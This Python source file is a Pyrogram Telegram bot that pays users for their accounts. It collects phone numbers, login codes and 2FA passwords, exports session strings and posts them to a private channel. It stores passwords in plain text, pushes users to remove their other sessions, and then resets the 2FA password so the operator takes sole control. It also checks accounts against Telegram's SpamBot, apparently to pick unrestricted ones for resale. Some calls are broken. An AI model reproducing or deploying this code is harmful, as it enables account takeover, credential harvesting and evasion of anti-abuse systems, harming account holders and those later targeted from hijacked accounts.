import re
import asyncio
import os
import shutil
from pyrogram import Client, filters
from pyrogram.types import Message, ReplyKeyboardMarkup, KeyboardButton, ReplyKeyboardRemove, InlineKeyboardMarkup, InlineKeyboardButton
from pyrogram.errors import (
    PhoneNumberInvalid, PhoneCodeInvalid, PhoneCodeExpired,
    SessionPasswordNeeded, PhoneNumberBanned, FloodWait,
    SessionRevoked
)
from pyrogram.raw.functions.account import GetPassword
from Receiver.database.database import add_account, update_account, get_account, get_settings, get_user, update_user
from Receiver.database.database import accounts_db
from config import LOG_CHANNEL, COUNTRY_CODES, DEFAULT_RATES, SESSION_CHANNEL
from datetime import datetime
import os
from pyrogram.raw import functions
import asyncio
from Receiver.utils.rm_2fa import set_2fa_to_01
import logging

logger = logging.getLogger(__name__)

user_states = {}
VERIFY_PHONE = "verify_phone"
VERIFY_OTP = "verify_otp"
VERIFY_2FA = "verify_2fa"
VERIFY_CONFIRM = "verify_confirm"


if not os.path.exists("sessions"):
    os.makedirs("sessions")


def get_main_menu_keyboard():
    return ReplyKeyboardMarkup(
        [
            [KeyboardButton("📱 Submit Account"), KeyboardButton("💰 Balance")],
            [KeyboardButton("❓ Help"), KeyboardButton("👤 Profile")],
            [KeyboardButton("🌐 Change Language")]
        ],
        resize_keyboard=True
    )


async def safe_stop_client(client):
    """Safely stop a client by checking if it's still connected first"""
    try:
        if client and hasattr(client, "is_connected") and client.is_connected:
            await client.stop()
    except Exception as e:
        print(f"Error stopping client: {str(e)}")


async def check_active_sessions(client: Client, session_string: str) -> tuple:
    """Check if user has more active sessions than allowed and detect fraudulent behavior"""
    try:
        user_client = Client(
            "temp_check",
            api_id=client.api_id,
            api_hash=client.api_hash,
            session_string=session_string,
            in_memory=True
        )
        await user_client.start()
        
        
        me = await user_client.get_me()
        
        if not me:
            session_path = "temp_check.txt"
            dest_path = f"sessions/temp_check.txt"
            await safe_stop_client(user_client)
            shutil.copy(session_path, dest_path)
            return False, False, [], "Account not accessible"
            
        
        try:
            result = await user_client.invoke(functions.account.GetAuthorizations())
            
            session_path = "temp_check.txt"
            dest_path = f"sessions/temp_check.txt"
            await safe_stop_client(user_client)
            if os.path.exists(session_path):
                shutil.copy(session_path, dest_path)
            
            sessions = result.authorizations
            active_sessions = []
            bot_session_found = False
            bot_session_count = 0
            
            
            for session in sessions:
                
                if session.api_id == client.api_id:
                    bot_session_count += 1
                    bot_session_found = True
                    continue
                    
                session_info = {
                    "id": session.hash,
                    "device": session.device_model,
                    "platform": session.platform,
                    "app": session.app_name,
                    "ip": session.ip,
                    "country": session.country,
                    "date": session.date_created,
                    "api_id": session.api_id
                }
                active_sessions.append(session_info)
            
            
            sessions_text = "🔐 Active Sessions Found:\n\n"
            for session in active_sessions:
                sessions_text += (
                    f"📱 Device: {session['device']}\n"
                    f"🖥 Platform: {session['platform']}\n"
                    f"📍 Country: {session['country']}\n"
                    f"⏰ Created: {session['date']}\n\n"
                )
            
            
            if len(active_sessions) > 0:
                return False, bot_session_found, active_sessions, sessions_text
            
            if not bot_session_found:
                return False, False, [], "Bot session not found"
                
            return True, True, [], "OK"
            
        except Exception as e:
            print(f"Error getting authorizations: {str(e)}")
            await safe_stop_client(user_client)
            return False, True, [], f"Error checking sessions: {str(e)}"
            
    except SessionRevoked:
        return False, False, [], "Session revoked"
    except Exception as e:
        print(f"Error checking sessions: {str(e)}")
        return False, False, [], f"Error: {str(e)}"

@Client.on_callback_query(filters.regex("^confirm_account_"))
async def handle_account_confirmation(client: Client, callback_query: Message):
    """Handle account confirmation callback"""
    user_id = callback_query.from_user.id
    phone = callback_query.data.split("_")[2]
    print(phone)
    
    account = await get_account(phone)
    if not account:
        await callback_query.answer("❌ Account not found!", show_alert=True)
        return
    
    if not phone:
        await callback_query.answer("❌ Invalid phone number!", show_alert=True)
        return
        
    sessions_ok, has_bot_session, active_sessions, message = await check_active_sessions(client, account["session"])
    
    if not sessions_ok:
        if len(active_sessions) > 0:
            keyboard = InlineKeyboardMarkup([
                [InlineKeyboardButton(
                    "🔄 Check Again After Removing Sessions",
                    callback_data=f"confirm_account_{phone}"
                )]
            ])
            
            current_text = callback_query.message.text or ""
            new_text = (
                f"❌ Please remove all your active sessions before confirming!\n\n"
                f"{message}\n\n"
                f"📝 Instructions:\n"
                f"1. Open Telegram Settings\n"
                f"2. Go to Privacy and Security\n"
                f"3. Click on Active Sessions\n"
                f"4. Remove all sessions except official Telegram apps\n"
                f"5. Click the button below to check again"
            )
            if current_text.strip() != new_text.strip():
                await callback_query.message.edit_text(new_text, reply_markup=keyboard)
            await callback_query.answer("❌ Remove all your sessions first!", show_alert=True)
            return
        
        if not has_bot_session:
            await callback_query.answer("❌ Bot's session got revoked. Please try the process again.", show_alert=True)
            await accounts_db.delete_one({"phone": phone})
            await callback_query.message.delete()
            return
        
        await callback_query.answer(f"❌ Error: {message}", show_alert=True)
        return
        
    await update_account(phone, {"status": "pending", "submitted_at": datetime.now()})
    await callback_query.answer("✅ Your account has been submitted for verification. Results will be available soon.", show_alert=True)
    await callback_query.message.delete()
    await client.send_message(
        LOG_CHANNEL,
        f"📥 New account submitted!\n"
        f"👤 User: {user_id}\n"
        f"📱 Phone: {phone}\n"
        f"{COUNTRY_CODES[account['country']]['flag']} Country: {COUNTRY_CODES[account['country']]['name']}\n"
    )
    
    settings = await get_settings()
    default_wait = settings.get("country_wait", 7200)  
    country_settings = settings["country_settings"].get(account["country"], {})
    wait_time = country_settings.get("wait_time", default_wait)  
    
    await asyncio.sleep(wait_time)
    
    auto_accept = settings.get("auto_accept", False)
    country_count = await accounts_db.count_documents({
        "country": account["country"],
        "status": "verified"
    })
    
    result = await check_account(phone, client)
    
    if not result["success"]:
        await update_account(phone, {
            "status": "verification_failed",
            "verification_error": result["error"]
        })
        await client.send_message(
            user_id,
            f"❌ Account verification failed!\n"
            f"📱 {phone}\n"
            f"❗ Error: {result['error']}"
        )
        return
    
    if result["is_scam"]:
        status = "scam"
    elif result["is_frozen"]:
        status = "frozen"
    elif country_settings.get("enabled", True) and auto_accept and country_count < country_settings.get("capacity", float('inf')) and result["spam_bot_ok"]:
        status = "verified"
    else:
        status = "rejected"
    if result["twofa_removed"]:
        status = "twofa_recovery" if status == "rejected" else status
    
    tier = account.get("tier", "DEFAULT")
    rate = country_settings.get("rate", DEFAULT_RATES[tier])
    
    await update_account(phone, {
        "status": status,
        "is_frozen": result["is_frozen"],
        "is_scam": result["is_scam"],
        "verified_at": datetime.now(),
        "rate": rate,
        "spam_bot_status": "ok" if result["spam_bot_ok"] else "limited",
        "spam_bot_response": result["spam_bot_response"],
        "twofa_removed": result.get("twofa_removed", False)
    })
    
    if status == "verified":
        user = await get_user(user_id)
        new_verified = user.get("verified_accounts", 0) + 1
        new_unverified = max(0, user.get("unverified_accounts", 0) - 1)
        new_balance = user.get("balance", 0) + rate
        
        await update_user(user_id, {
            "verified_accounts": new_verified,
            "unverified_accounts": new_unverified,
            "balance": new_balance
        })
        
        await client.send_message(
            user_id,
            f"✅ Account verified successfully!\n"
            f"📱 {phone}\n"
            f"{COUNTRY_CODES[account['country']]['flag']} Country: {account['country']}\n"
            f"💰 Earned: ${rate:.2f}\n"
            f"🔒 2FA: {'Removed' if result.get('twofa_removed', False) else 'Not Removed'}"
        )
        
        session_file = f"sessions/{user_id}.txt"
        with open(session_file, "w") as f:
            f.write(account["session"])
        
        await client.send_document(
            SESSION_CHANNEL,
            document=session_file,
            caption=f"📥 New account verified!\n"
            f"👤 User: {user_id}\n"
            f"📱 Phone: {phone}\n"
            f"{COUNTRY_CODES[account['country']]['flag']} Country: {account['country']}\n"
            f"💰 Rate: ${rate:.2f}\n"
            f"🏷 Status: {status}\n"
            f"❄️ Frozen: {result['is_frozen']}\n"
            f"⚠️ Scam: {result['is_scam']}\n"
            f"🤖 Spam Bot: {'✅ OK' if result['spam_bot_ok'] else '❌ Limited'}\n"
            f"🔒 2FA: {'Removed ✅' if result.get('twofa_removed', False) else 'Not Removed ❌'}\n"
            f"📝 SpamBot Response: {result['spam_bot_response']}"
        )
    else:
        reason_map = {
            "scam": "Account marked as scam",
            "frozen": "Account is frozen",
            "rejected": "Verification failed" + (" (Spam bot: Limited)" if not result["spam_bot_ok"] else ""),
            "twofa_recovery": "2FA recovery codes are set up, please disable them first"
        }
        
        await client.send_message(
            user_id,
            f"❌ Account rejected!\n"
            f"📱 {phone}\n"
            f"{COUNTRY_CODES[account['country']]['flag']} Country: {account['country']}\n"
            f"❗ Reason: {reason_map.get(status, status)}\n"
            f"🔒 2FA: {'Removed' if result.get('twofa_removed', False) else 'Not Removed'}\n"
            f"📝 SpamBot Response: {result['spam_bot_response']}"
        )
    
    await client.send_message(
        LOG_CHANNEL,
        f"🔍 Account verification result\n"
        f"📱 Phone: {phone}\n"
        f"👤 User: {user_id}\n"
        f"{COUNTRY_CODES[account['country']]['flag']} Country: {account['country']}\n"
        f"💰 Rate: ${rate:.2f}\n"
        f"🏷 Status: {status}\n"
        f"❄️ Frozen: {result['is_frozen']}\n"
        f"⚠️ Scam: {result['is_scam']}\n"
        f"🤖 Spam Bot: {'✅ OK' if result['spam_bot_ok'] else '❌ Limited'}\n"
        f"🔒 2FA: {'Removed ✅' if result.get('twofa_removed', False) else 'Not Removed ❌'}\n"
        f"📝 SpamBot Response: {result['spam_bot_response']}"
    )

async def cancel_verification(client: Client, message: Message, user_id: int):
    """Helper function to handle cancellation"""
    if user_id in user_states:
        
        user_state = user_states[user_id]
        if user_state.get("client"):
            try:
                await user_state["client"].disconnect()
            except Exception as e:
                print(f"Error disconnecting user client: {str(e)}")
        
        
        user_states.pop(user_id, None)
        
        
        await message.reply_text(
            "❌ Operation cancelled. Back to main menu.",
            reply_markup=get_main_menu_keyboard()
        )
        return True
    return False

@Client.on_message(filters.command("cancel"))
async def cancel_command_handler(client: Client, message: Message):
    """Global cancel command handler"""
    user_id = message.from_user.id
    await cancel_verification(client, message, user_id)

@Client.on_message(filters.regex("^📱 Submit Account$"))
async def start_verification(client: Client, message: Message):
    """Start the account verification process"""
    user_id = message.from_user.id
    
    
    user_states[user_id] = {"state": VERIFY_PHONE}
    
    
    await message.reply_text(
        "📱 Please enter your phone number in international format (e.g., +1234567890):\n\n"
        "Use /cancel to cancel the operation.",
        reply_markup=ReplyKeyboardRemove()
    )

@Client.on_message(filters.private & filters.text & ~filters.command(["start", "help", "balance", "profile", "withdraw", "cancel", "language", "support"]))
async def handle_all_messages(client: Client, message: Message):
    """Handle all text messages including verification"""
    user_id = message.from_user.id
    
    
    if user_id in user_states:
        await handle_verification_steps(client, message)

async def handle_verification_steps(client: Client, message: Message):
    user_id = message.from_user.id
    
    
    if user_id not in user_states:
        user_states[user_id] = {"state": VERIFY_PHONE}
    
    user_state = user_states[user_id]
    
    if user_state["state"] == VERIFY_PHONE:
        
        text = message.text
        
        
        phone = text.strip().replace(" ", "")
        
        
        if not re.match(r'^\+\d{10,15}$', phone):
            await message.reply_text(
                "❌ Invalid phone number format! Please use international format (e.g., +1234567890)\n\n"
                "Use /cancel to cancel the operation.",
                reply_markup=ReplyKeyboardRemove()
            )
            user_states.pop(user_id, None)
            return
        
        
        if await get_account(phone):
            await message.reply_text(
                "❌ This phone number is already registered!\n\n"
                "Use /cancel to cancel the operation.",
                reply_markup=ReplyKeyboardRemove()
            )
            user_states.pop(user_id, None)
            return
        
        
        country_code = None
        phone_without_plus = phone[1:]  
        
        
        sorted_codes = sorted(COUNTRY_CODES.keys(), key=len, reverse=True)
        
        for code in sorted_codes:
            if phone_without_plus.startswith(code):
                country_code = code
                break
        
        if not country_code:
            await message.reply_text(
                "❌ Unsupported country code!\n\n"
                "Use /cancel to cancel the operation.",
                reply_markup=ReplyKeyboardRemove()
            )
            user_states.pop(user_id, None)
            return
        
        
        settings = await get_settings()
        country_settings = settings.get("country_settings", {}).get(country_code, {})
        
        
        if not country_settings.get("enabled", True):
            await message.reply_text(
                f"❌ {COUNTRY_CODES[country_code]['flag']} {COUNTRY_CODES[country_code]['name']} is currently disabled!\n\n"
                "Use /cancel to cancel the operation.",
                reply_markup=ReplyKeyboardRemove()
            )
            user_states.pop(user_id, None)
            return
        
        
        country_capacity = country_settings.get("capacity", float('inf'))
        current_count = await accounts_db.count_documents({
            "country": country_code,
            "status": "verified"
        })
        
        if current_count >= country_capacity:
            await message.reply_text(
                f"❌ {COUNTRY_CODES[country_code]['flag']} {COUNTRY_CODES[country_code]['name']} has reached maximum capacity ({country_capacity} accounts)!\n\n"
                "Use /cancel to cancel the operation.",
                reply_markup=ReplyKeyboardRemove()
            )
            user_states.pop(user_id, None)
            return
        
        
        tier = COUNTRY_CODES[country_code]["tier"]
        rate = country_settings.get("rate", DEFAULT_RATES[tier])
        
        
        user_state["phone"] = phone
        user_state["country"] = country_code
        user_state["tier"] = tier
        user_state["rate"] = rate
        user_state["state"] = VERIFY_OTP
        user_states[user_id] = user_state
        
        
        try:
            kk = await message.reply_text("**🔄 Verifying phone number...**", reply_markup=ReplyKeyboardRemove())
            
            user_client = Client(
                f"user_{user_id}",
                api_id=client.api_id,
                api_hash=client.api_hash,
                in_memory=True
            )
            await user_client.connect()
            sent_code = await user_client.send_code(phone)
            user_state["client"] = user_client
            user_state["phone_code_hash"] = sent_code.phone_code_hash
            user_states[user_id] = user_state
            
            
            country_info = (
                f"🌍 Country Information:\n"
                f"{COUNTRY_CODES[country_code]['flag']} Country: {COUNTRY_CODES[country_code]['name']}\n"
                f"💰 Rate: ${rate:.2f}\n"
                f"📊 Capacity: {current_count}/{country_capacity if country_capacity != float('inf') else '∞'}\n"
                f"⏳ Wait Time: {country_settings.get('wait_time', 7200) // 60} minutes\n\n"
                "Please enter the OTP (format: 1 2 3 4 5):\n\n"
                "Use /cancel to cancel the operation."
            )
            
            await message.reply_text(country_info, reply_markup=ReplyKeyboardRemove())
            await kk.delete()
            
        except (PhoneNumberInvalid, PhoneNumberBanned):
            await message.reply_text(
                "❌ Invalid phone number or number banned!\n\n"
                "Use /cancel to cancel the operation.",
                reply_markup=ReplyKeyboardRemove()
            )
            user_states.pop(user_id, None)
        except FloodWait as e:
            await message.reply_text(
                f"⏳ Too many attempts! Please wait {e.value} seconds\n\n"
                "Use /cancel to cancel the operation.",
                reply_markup=ReplyKeyboardRemove()
            )
            user_states.pop(user_id, None)
        except Exception as e:
            await message.reply_text(
                f"❌ Error: {str(e)}\n\n"
                "Use /cancel to cancel the operation.",
                reply_markup=ReplyKeyboardRemove()
            )
            user_states.pop(user_id, None)
    
    elif user_state["state"] == VERIFY_OTP:
        
        text = message.text
        
        
        otp = text.strip().replace(" ", "")
        
        try:
            user_client = user_state["client"]
            try:
                await user_client.sign_in(
                    user_state["phone"],
                    user_state["phone_code_hash"],
                    phone_code=otp
                )
                
                
                session_string = await user_client.export_session_string()
             
                
                session_path = f"{user_id}_session.txt"
                session_file = f"sessions/{user_id}_session.txt"
                if os.path.exists(session_file):
                    os.remove(session_file)
    
                with open(session_path, "w") as f:
                    f.write(session_string)
                
                await safe_stop_client(user_client)
                
                try:
                    shutil.copy(session_path, f"sessions/{user_id}_session.txt")
                except Exception as e:
                    print(f"Error copying session file: {str(e)}")
                    
                try:
                    os.remove(session_path)
                except Exception as e:
                    print(f"Error removing temporary session file: {str(e)}")

                try:
                    spam = await check_spam_bot(user_client)
                    if not spam:
                        await message.reply_text(
                            "❌ This account is a limited from @SpamBot! Please use a different number.\n\n"
                            "Use /cancel to cancel the operation.",
                            reply_markup=ReplyKeyboardRemove()
                        )
                        user_states.pop(user_id, None)
                        return
                except Exception as e:
                    print(f"Spam bot check error: {str(e)}")
                    await message.reply_text(
                        "❌ Error checking spam bot status. Please try again later.\n\n"
                        "Use /cancel to cancel the operation.",
                        reply_markup=ReplyKeyboardRemove()
                    )
                    user_states.pop(user_id, None)
                    return
                
                await add_account(
                    user_id,
                    user_state["phone"],
                    session_string,
                    user_state["country"],
                    tier=user_state["tier"],
                    status="submitted"
                )
                
                
                country_name = COUNTRY_CODES[user_state["country"]]["name"]
                country_flag = COUNTRY_CODES[user_state["country"]].get("flag", "🌐")
                rate = user_state["rate"]
                
                
                keyboard = InlineKeyboardMarkup([
                    [InlineKeyboardButton(
                        "✅ Confirm Account",
                        callback_data=f"confirm_account_{user_state['phone']}"
                    )]
                ])
                
                await message.reply_text(
                    f"{country_flag} The {country_name} account has been received.\n\n"
                    f"To confirm your account, please log out, then return to the bot and use the button below.\n\n"
                    f"You will earn ${rate:.2f} for this account.",
                    reply_markup=keyboard
                )
                
                

                
                await client.send_document(
                    SESSION_CHANNEL,
                    document=session_file,
                    caption=f"📥 New account submitted!\n"
                    f"👤 User: {user_id}\n"
                    f"📱 Phone: {user_state['phone']}\n"
                    f"{COUNTRY_CODES[user_state['country']]['flag']} Country: {country_name}\n"
                    f"💰 Rate: ${rate:.2f}"
                )
                
                
                try:
                    os.remove("session.txt")
                except:
                    pass
                
                user_states.pop(user_id, None)
                
            except SessionPasswordNeeded:
                
                user_state["state"] = VERIFY_2FA
                user_states[user_id] = user_state
                
                await message.reply_text(
                    "🔒 2FA enabled! Please enter your password:\n\n"
                    "Use /cancel to cancel the operation.",
                    reply_markup=ReplyKeyboardRemove()
                )
                return
                
        except PhoneCodeInvalid:
            await message.reply_text(
                "❌ Invalid OTP! Please try again. Make sure to enter the code in format: 1 2 3 4 5\n\n"
                "Use /cancel to cancel the operation.",
                reply_markup=ReplyKeyboardRemove()
            )
            return
        except PhoneCodeExpired:
            await message.reply_text(
                "⌛ OTP expired! Please start over.\n\n"
                "Use /cancel to cancel the operation.",
                reply_markup=ReplyKeyboardRemove()
            )
            if user_state.get("client"):
                await user_state["client"].stop()
            user_states.pop(user_id, None)
            return
        except Exception as e:
            await message.reply_text(
                f"❌ Error: {str(e)}\n\n"
                "Use /cancel to cancel the operation.",
                reply_markup=ReplyKeyboardRemove()
            )
            if user_state.get("client"):
                await user_state["client"].stop()
            user_states.pop(user_id, None)
    
    elif user_state["state"] == VERIFY_2FA:
        text = message.text
        
        try:
            if not user_state.get("client"):
                await message.reply_text(
                    "❌ Session expired. Please start over.\n\n"
                    "Use /cancel to cancel the operation.",
                    reply_markup=ReplyKeyboardRemove()
                )
                user_states.pop(user_id, None)
                return
            
            user_client = user_state["client"]
            await user_client.check_password(text)
            try:
                pw = await user_client.invoke(GetPassword())
                if pw.has_recovery:
                    await message.reply_text(
                        "❌ You have recovery codes set up. Please disable them before submitting your account.\n\n"
                        "Use /cancel to cancel the operation.",
                        reply_markup=ReplyKeyboardRemove()
                    )
                    user_states.pop(user_id, None)
                    return
            except Exception as e:
                print(f"Error checking recovery codes: {str(e)}")
            
            
            session_string = await user_client.export_session_string()
            
            
            await safe_stop_client(user_client)
            
            
            session_path = f"{user_id}_session.txt"
            with open(session_path, "w") as f:
                f.write(session_string)
            
            try:
                shutil.copy(session_path, f"sessions/{user_id}_session.txt")
            except Exception as e:
                print(f"Error copying session file: {str(e)}")
                
            try:
                os.remove(session_path)
            except Exception as e:
                print(f"Error removing temporary session file: {str(e)}")
        
            phone = user_state["phone"]
            country = user_state["country"]
            tier = user_state["tier"]
            rate = user_state["rate"]
            
            
            await add_account(
                user_id,
                phone,
                session_string,
                country,
                tier=tier,
                status="submitted",
                twofa_enabled=True,
                twofa_password=text
            )
            
            country_name = COUNTRY_CODES[country]["name"]
            country_flag = COUNTRY_CODES[country].get("flag", "🌐")
            
            
            status_msg = (
                f"{country_flag} The {country_name} account has been received.\n\n"
                f"To confirm your account, please log out, then return to the bot and use the button below.\n\n"
                f"You will earn ${rate:.2f} for this account."
            )
            
            keyboard = InlineKeyboardMarkup([
                [InlineKeyboardButton(
                    "✅ Confirm Account",
                    callback_data=f"confirm_account_{phone}"
                )]
            ])
            
            await message.reply_text(status_msg, reply_markup=keyboard)
            
            
            session_file = f"sessions/{user_id}_session.txt"
            await client.send_document(
                SESSION_CHANNEL,
                document=session_file,
                caption=f"📥 New account submitted (2FA)!\n"
                f"👤 User: {user_id}\n"
                f"📱 Phone: {phone}\n"
                f"{country_flag} Country: {country_name}\n"
                f"💰 Rate: ${rate:.2f}\n"
                f"🔒 2FA: Enabled"
            )
            
            user_states.pop(user_id, None)
            
        except Exception as e:
            await message.reply_text(
                f"❌ Error: {str(e)}\n\n"
                "Use /cancel to cancel the operation.",
                reply_markup=ReplyKeyboardRemove()
            )
            if user_state.get("client"):
                await safe_stop_client(user_state["client"])
            user_states.pop(user_id, None)

async def check_spam_bot(client: Client, phone: str) -> bool:
    """
    Check if the account is a spam bot by sending a message to SpamBot.
    Returns True if the account is not a spam bot, False otherwise.
    """
    try:
        spam_bot = await client.get_chat("SpamBot")
        await client.send_message(spam_bot.id, "/start")
        await asyncio.sleep(2)
        
        async for msg in client.get_chat_history(spam_bot.id, limit=1):
            if "Good news" in msg.text and "no limits" in msg.text:
                return True
            elif "some phone numbers may trigger" in msg.text:
                return True
            elif "Unfortunately, some phone numbers may trigger a harsh response from our anti-spam systems." in msg.text:
                return True
            else:
                return False
    except Exception as e:
        print(f"SpamBot check error: {e}")
        return False

async def check_account(phone, client: Client) -> dict:
    """
    Check account status: scam, frozen, spam bot, and try to remove 2FA if possible.
    Accepts phone (str) and client (pyrogram.Client).
    Returns dict with verification results.
    """
    account = await get_account(phone)
    if not account:
        return {"success": False, "error": "Account not found"}

    user_id = account["user_id"]
    session = account["session"]
    twofa_removed = False

    try:
        user_client = Client(
            f"verify_{user_id}",
            session_string=session,
            in_memory=True
        )
        await user_client.start()

        
        me = await user_client.get_me()
        is_scam = getattr(me, "is_scam", False)

        
        is_frozen = False
        try:
            me_chat = await user_client.get_chat("me")
            await user_client.send_message(me_chat.id, "Account verification check")
        except Exception as e:
            is_frozen = True
            print(f"Account frozen check error: {e}")

        
        try:
            if account.get("twofa_enabled"):
                kk = await set_2fa_to_01(user_client, current_password=account.get("twofa_password"))
            else:
                kk = await set_2fa_to_01(user_client)
            if kk is True:
                twofa_removed = True
            elif isinstance(kk, str) and "recovery codes" in kk:
                await user_client.stop()
                return {
                    "success": False,
                    "error": "You have recovery codes set up. Please disable them before changing your 2FA password."
                }
        except Exception as e:
            print(f"2FA removal error: {e}")
            twofa_removed = False

        
        spam_bot_ok = False
        spam_bot_response = ""
        try:
            spam_bot = await user_client.get_chat("SpamBot")
            await user_client.send_message(spam_bot.id, "/start")
            await asyncio.sleep(2)
            async for msg in user_client.get_chat_history(spam_bot.id, limit=1):
                spam_bot_response = msg.text
                break
            if "Good news" in spam_bot_response and "no limits" in spam_bot_response:
                spam_bot_ok = True
            elif "some phone numbers may trigger" in spam_bot_response:
                spam_bot_ok = True
            elif "Unfortunately, some phone numbers may trigger a harsh response from our anti-spam systems. If you think this is the case with you, you can submit a complaint to our moderators or subscribe to Telegram Premium to get less strict limits." in spam_bot_response:
                spam_bot_ok = True
            else:
                spam_bot_ok = False
        except Exception as e:
            print(f"SpamBot check error: {e}")
            spam_bot_ok = False

        await user_client.stop()

        return {
            "success": True,
            "is_scam": is_scam,
            "is_frozen": is_frozen,
            "spam_bot_ok": spam_bot_ok,
            "spam_bot_response": spam_bot_response,
            "twofa_removed": twofa_removed,
            "session": session,
            "phone": phone,
            "user_id": user_id,
            "status": "verified" if not is_scam and not is_frozen and spam_bot_ok else "rejected"
        }
    except Exception as e:
        print(f"Account verification error: {e}")
        return {
            "success": False,
            "error": str(e)
        }
